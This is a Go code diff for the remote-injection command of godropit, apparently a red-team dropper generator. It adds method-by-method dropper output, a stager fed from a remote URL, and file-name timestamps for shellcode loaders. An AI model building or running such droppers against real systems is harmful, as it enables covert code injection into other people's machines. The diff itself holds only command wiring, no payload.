@@ -2,6 +2,8 @@ package cmd
 
 import (
 	"log"
+	"strings"
+	"time"
 
 	"github.com/kopp0ut/godropit/internal/godroplib/remote"
 	"github.com/kopp0ut/godropit/pkg/gengo"
@@ -21,7 +23,11 @@ var remoteCmd = &cobra.Command{
 		if input == "" {
 			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
 		}
-		name = check(name)
+
+		if prestamp {
+			name = time.Now().UTC().Format("010206_1504") + "_" + name
+		}
+
 		var remoteDrop gengo.Dropper
 		var Dtype gengo.DtypeRemote
 		var err error
@@ -29,7 +35,7 @@ var remoteCmd = &cobra.Command{
 
 		Dtype.Args = procArgs
 		Dtype.Pid = pid
-		remoteDrop.Delay = time
+		remoteDrop.Delay = timer
 		remoteDrop.Arch = arch
 		remoteDrop.Shared = shared
 		remoteDrop.Debug = debug
@@ -39,9 +45,25 @@ var remoteCmd = &cobra.Command{
 			log.Fatalln(err)
 		}
 
-		remoteDrop.Dlls, remoteDrop.Inject, remoteDrop.Import, remoteDrop.Extra = remote.SelectRemote()
+		shellcode := gengo.NewShellcode(&remoteDrop, input, output, name, sgn)
 
-		gengo.NewDropper(remoteDrop, name, domain, input, output, stagerurl, imgpath, hostname, ua, sgn)
+		if stagerurl != "" {
+			gengo.NewStager(&remoteDrop, shellcode, stagerurl, imgpath, hostname, ua, name, output)
+
+		}
+
+		if len(methods) >= 1 {
+			for i := range methods {
+				method := methods[i]
+				remoteDrop.Dlls, remoteDrop.Inject, remoteDrop.Import, remoteDrop.Extra = remote.SelectRemote(strings.ToLower(method))
+				methodname := name + "_" + method
+				gengo.NewDropper(remoteDrop, methodname, domain, input, output)
+			}
+		} else {
+			remoteDrop.Dlls, remoteDrop.Inject, remoteDrop.Import, remoteDrop.Extra = remote.SelectRemote("")
+
+			gengo.NewDropper(remoteDrop, name, domain, input, output)
+		}
 	},
 }
 
